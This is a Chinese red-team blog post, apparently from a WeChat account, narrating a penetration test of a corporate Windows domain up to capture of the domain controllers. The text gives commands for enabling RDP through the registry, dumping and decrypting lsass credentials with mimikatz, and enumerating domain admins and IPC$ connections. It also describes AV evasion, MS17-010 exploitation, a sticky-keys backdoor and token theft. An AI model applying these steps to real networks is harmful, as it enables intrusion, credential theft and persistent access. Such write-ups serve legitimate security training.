> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qVUZsOHqEpkptN3IviErLA)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **47** 篇文章，本公众号会记录一些红队攻击的笔记（由浅到深），不定时更新

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

前言

最近接了很多广告，也没输出啥好文章给兄弟们，之前搞实战的时候也没写过实战相关的文章，这次写了一篇实战域渗透的，都是常规操作，主要还是内网渗透那些东西。由于是项目，全程打码，话不多说兄弟们看文章就完事了。

**Pypass 趋势杀毒一步步打穿内网拿下域控**

**内网信息搜集**

  

首先是通过上传拿到了一个 webshell：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia3XFYImccpeqmQ0rxYOtQHDPOaYvDvicOyXjpeVSXXgT2fwUrXFNLhNA/640?wx_fmt=png)

然后通过 Powershell 弹到我 C2 上发现是存在域环境，域名是：**ta.org.** ！  

查看当前域内机器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia0QKVn1WvibKz6NKn71Bm0bibGnOaa8v9oQiaBRm05w5zxlD8bABzzoK5Q/640?wx_fmt=png)

发现域控有多两台：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaUad1LtbUHu24MC9vMykNia7dZw6hcsIIBJDJ5kTfoTKp52QdMrcyC8A/640?wx_fmt=png)

Ping 域控机器名得到域控 IP：192.168.30.110、192.168.30.111  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiamwn2BYwPf4bFcSibaaovCe7oX8a6EZtYLpeIjOHFLVK6sajCt3fia6Eg/640?wx_fmt=png)

tasklist /svc 发现当前机器存在趋势杀毒：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaSvZGLQMia3J1XwRjnws18jWVctoopqvCavHmpaSlzfzGypkgtcrMF5w/640?wx_fmt=png)

之后通过免杀上线到我 C2：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiagQtoezMIy5AhTwuNGO2jsY2XgNdQbIEkOm5uOFs9N1pDbmWkRAOqSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia16tsR0EXzUgfAseqroSrGfrROF0MUWRue4JeMUkvfEzibXu2xDtUzqA/640?wx_fmt=png)

**内网域渗透第一天**

  

上线后做好免杀然后通过 Nbtscan 发现内网存活：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiareRpMNzNAiadG5Jqmzlg0r1kylQzYFdd0WdicSuOTUNZqxZsbPPVjjuw/640?wx_fmt=png)

通过梼杌的插件提权失败后，然后我是先上传了 frp 先把流量代理出来：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaAbSKo6ZgPia1f8EIgeVCHeZSaKMq69B4tqBw5rIEBKb84VhoxlBjE2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaeF4xNzaIgNPfhZgfRCacmlJrt8XksPib1b7icMMA4MoRysibuoLqCUibSg/640?wx_fmt=png)

代理成功：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiazZuPwtnXEIXy3QI33FaxM6eT4LgNhA4xgrZribibJGFYrRBcqnfq8KOQ/640?wx_fmt=png)

然后 Metasploit 设置 socks5 代理：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiagl63gib83YIjUTOlll4nwZuiaC5Pibm2kcIlL4uuwgsiaDLadeUAEKt0Ag/640?wx_fmt=png)

通过扫了一遍内网 smb 存活发现内网 03 机器很多，猜测有 ms17010：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia9a2q9I39yxTejhkclTwVDWlhE2BrxnDE7TAUtoiasYvqMmwZ878o06A/640?wx_fmt=png)

看来没猜错果然中奖了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaSpd3uc0dPXx7LIvyibI2icsJLaSGwtCXugQ2icNJHItFD4YtdGTl4zNJQ/640?wx_fmt=png)

先打 08 这台把：192.168.30.116  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaJ1Y2ToFDJhAaEg3R3CRGessaHolbrSwFtxwf5icchIYAngIVrpSeZvw/640?wx_fmt=png)

但是失败了！

发现打 03 成功：192.168.30.8

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiabDCjHPKtz15K1PzW4JckumadrNgPfXkPa0leW0uHT2uR7LR9yRkUiaw/640?wx_fmt=png)

没办法 03 只能通过执行命令，MSF 的模块没得 32 位的 Payload，我添加了一个 asp*** 用户进去：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiayaVYuibvicYFfZtpyRKjic2sq0lAJjLngNiacQCcAAX74Vw84Xr8YuH43w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaKKm10MfBrYianZjKUIZBOVogoM36iazuCZJIsjuT2ZgFChXnNWvZM5pg/640?wx_fmt=png)

然后开启了他的 3389 ：  

```
REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia85od9eEdHj0f5mHCJekmsKglP5jQibSiaiaNfqXiaqVUhWU44Hav8pXBpQ/640?wx_fmt=png)

成功登录到他远程桌面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaDn14j5hCeOqS7kicD1SultkePatlh9iaxcuIb7xuDyZ5rwjvbtyGZhLg/640?wx_fmt=png)

通过信息搜集发现这台机器不出网：（这里说一下，测试出网大家可以使用 NC 看看目标是否出网，测试 TCP、UDP、DNS 这三种即可，因为如果底层的协议都不出网，你在测试一些其他协议出网也毫无意义！）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia1IGGbkK3vRR6RfyscJOuMoDEMrqYF8nnGDGzMywnP8Fg1pNIavQNOg/640?wx_fmt=png)

由于 03 服务器不能复制文件，我只能把文件通过映射到他的磁盘来传输文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaHgpTgzvicvmD4586bqfO7LE9LImLjVUDBJJ8sLjwHJT9OTkqRlgfKRQ/640?wx_fmt=png)

老思路先克隆个 administrator 用户过来：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaMD5W2WDkGYRib0cN8yjm69yOjr9qP3b9MAY67Iic1rCqFKXqMHDFHH3A/640?wx_fmt=png)

克隆后发现之前 administrator 之前执行了一些命令：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiagDV7icCTIxXxiaZibmMkuSbMffbyYmZx5apWF3kev2RzBUgnZkRRE4kBQ/640?wx_fmt=png)

不管了，先用 procdump 把密码读出来：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiatxHqZia28yMtYcicYllIUnQyPSqMiasymdRrzCJ4VWw5q823aib1PoJ1nw/640?wx_fmt=png)

然后拖会本地后删除文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaKYmibiaM2HPfv35PuvtvnsBzgYiaDDO7gIEwSkIO6Hte5PLQZH9AugPBw/640?wx_fmt=png)

最后使用 mimikatz 进行解密：  

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
```

得到了 administrator 的明文密码：  

```
* Username : Administrator
   * Domain   : *****DB
   * Password : *****@dba
```

然后直接登录 administrator 的机器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiarExNMgibSMG6LicUwAKuCrTXH6PUjhGzxZjwicMRRQgOpypYFjmpbjQpA/640?wx_fmt=png)

然后把我之前创建的 asp***** 用户删除：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiazsrLGdzibfHIdmYDqhyxwxISuyk0OxTywibQlt00w6ccpia1AdLoofENg/640?wx_fmt=png)

通过搜集信息的时候发现了 11 年这台机器的 rdp 记录：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaLx2eaTgNUhw0ZXp8XrBeQ1ymzdf6M9M5nG6skRJN1e3HzDK4jU0V2w/640?wx_fmt=png)

但是连接不上：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaANibhVHFI1qIYor91yPFZarblRxag0rEsLiaraicagdMGY8a2cLmHjuLQ/640?wx_fmt=png)

然后再这台机器上没找到可利用的信息后，随手留了一个粘滞键的后门：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaBuhEQicZhTQAGouicPCv2K6Uibwgw9zFYialKEQA4YtGGibMMC3hs6o6eXg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiatibPoDvOvibGPTFVjFDSAxOQRo83h2HQicMZiabhZ1eWurrRh9g5b1xj3g/640?wx_fmt=png)

之后扫描内网 HTTP 服务的时候发现了一个投影仪系统，弱口令撸了进去：admin:admin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaa6L7QiagWUFRGM9TI61vfCv7dhPabIuatpcrEia0SypMcQkslDxTWY2g/640?wx_fmt=png)

由于搞站的时候比较晚了，搞到这我就去睡觉了。  

**内网域渗透第二天**

  

就在昨晚睡着，做了一个梦，梦到我上课迟到了，然后回到座位上看到我作业上一个 Metasploit 的 Shell，然后就醒了！

睡醒后的，我再一次拿起 MSF 打了一遍 08 的机器，结果成功了？卧槽这个梦牛逼啊！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiajdCzfydyIRZCV9d7DL1Jrfzj0Ae73ZHBxf3RwpZ7QbjW38ricXFyAyw/640?wx_fmt=png)

这尼玛渗透有时候就需要天时地利人和！

通过 Ping google 发现 192.168.30.116 能出网：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaWnrXOR7maSOtxVwSzibfQdfc78akZGhaPF9Yuib0B9Qv8wGOC07WLiaZw/640?wx_fmt=png)

然后创建个管理员用户 asp****:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaUVW2ILkuWoPoKM7hrFS2RoK2fjA2MibLh8yGOIZPicawPEpRczal3ib0Q/640?wx_fmt=png)

登录到他远程桌面：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJiaVgAtuWibZUlg40enpDOVHWT0F38fQPMvIpBskhBIlBlTmrfB1Kb9GFKl8pViafnXaGEQ0ErPdy0Q/640?wx_fmt=png)

随后克隆用户 adminisrtrator：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJiaVgAtuWibZUlg40enpDOVHESmN25h79meIh7cVdJibrtsg5PmYk9ONNnXPZhEE9IBkgMMYduePrvQ/640?wx_fmt=png)

随后做了免杀让他上线到我 CS：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaB9nt1SytY8XAYGlnIicPiaqJsNfMbviayQWk1zxibdSyGjFQL8fAx2uBkA/640?wx_fmt=png)

之后抓到了一个域用户的 hash：  

```
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 438866 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ****DSM$
Domain            : ****A
Logon Server      : (null)
Logon Time        : 2021/1/27 上午 12:22:29
SID               : S-1-5-20
  msv :  
   [00000003] Primary
   * Username : ****ADSM$
   * Domain   : ****A
   * NTLM     : 0a4b2******************************
   * SHA1     : 623e30**************************
```

这个时候由于我们是一个工作组用户，得想办法搞到一个域用户！  

通过 MSF 的令牌窃取：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia8KFuRQicXrUIib5NxGJKp93aElOuy88bH7rvhiaViceicUEsruLggaqVBLg/640?wx_fmt=png)

发现失败了：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaVspRzicdbSxVnCJnHmmGg0MYcLxkDySLHvHYxAzQCV8l2KnoaDOicNFg/640?wx_fmt=png)

回头看看 Win 10 这台，使用 getsystem 直接提取成功了：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaOCct0m2uBwlB4O51hhvKjmibciaqXAiaUs9NOnfQiabmWJNESah2qKloxA/640?wx_fmt=png)

之后通过注入 System 进程成功反弹一个 System 的 shell：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiavroaHibUXqlymokBRL4wMdMQFWfsKYZRwzHzIT4uvBFmbayztNbc0kQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaXmdiaqXichbgYEDbqKibYkhIvxdmApm24lh5JU5P101ByxrxG9SD0RrJg/640?wx_fmt=png)

之后发现进程里还有其他的域用户：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaMiaeospqhcdHtD91NeAfvrmSgHnpicCPLVbmG25picXt5HAaJCs35VrLw/640?wx_fmt=png)

再注入进程得到一个域用户的 shell：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia5j0PqXibGVoAS1ee3Gpic3DKnX7tyzIaiajBc4sicgyjKI7NM56bsdWP3w/640?wx_fmt=png)

最后抓一下密码：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiazdeqqwzPyzibmwfdGH5GUrlGmRp8q7wVCyvKM05siaMqy26ohW2aJy9g/640?wx_fmt=png)

然后通过定位域管 ：  

```
shell net group "domain admins" /domain
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaL7VDuO2aNC5ac254siaP88CdaLAmN4rIPJL3QT6MtictsD9Giacib3mTNA/640?wx_fmt=png)

发现域管的账号是 A013，发现也在进程里，直接注入进程上线成功：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiawZ8icJTc7Zjbys05mXHxUg3PE5u4AwkF6KbtOicxYRSBpLupxWkPN9Kw/640?wx_fmt=png)

先查看域控是那些机器：  

```
shell net group "domain controllers" /domain
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyia2LIM4VTe87YCQYeAkP9IC2DesbLD9QHjdibkuicSib7X3JPWwW5cEqUicA/640?wx_fmt=png)

发现域控有两台！然后通过 Ping 域控的主机名：****DC01、****DC02

得到域控的 IP：192.168.30.110、192.168.30.111

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiap5crOFn1caf3kEYSvueAdc1JiaqqB3xCqjpuq1onvhClyfC5QBicCr4Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaPUNsTQmUBibsnAuq1kQOPGxvudonU4mGBLT7hH5vwfCQlnJDoHaSgqw/640?wx_fmt=png)

然后和域控建立 IPC$:  

```
shell net use \\****DC01\ipc$
shell net use \\****DC02\ipc$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaVsNsKIU9wEPOEFzicwsiakbCdKR7ribTBnt5L7ialelTicNuQwV8ZOdk5eQ/640?wx_fmt=png)

有域管进程就好办了，直接窃取令牌，直接拿域控横向上线：（因为域管本来就可以直接和任何机器建立连接，并且都是最大权限，所以不需要密码）  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaHy48LQv6zRR225LMgnSoYN1znZRvvtKd6ibickzQpZmVyibH0dSHnOzrA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiasHeo3IvseSz8WfJeNscLpePhh09xy1IxqmaBQ3fsaZG5hoEXQ7mmgQ/640?wx_fmt=png)

成功上线域控：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiauD5ic5Epkib2F9WCaibk6eQu4DibQeva8tic05eENyyEfbQ5fy0sTYP28nA/640?wx_fmt=png)

最后通过注入进程成功上线域管理员账号：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaeYad59GibZuPibsxibbGiacAYqGp5OmjwmGvU0pvaxfNqfOm1MazS5vvXQ/640?wx_fmt=png)

至此域渗透完结：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKSInmnvgEXXgZkLznYcZyiaRRI33LRuDNUrvLV20kYpnzZPJq3jmFybpy8kqlxx5aRz668Xq4sw4w/640?wx_fmt=png)

他内网其实还有很多机器还可以打，一些 Web 比如 Tomcat，Weblogic，Jboss 一些漏洞还是可以利用打下来的，由于我的目标就是拿到域控所以就不深入了。  

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看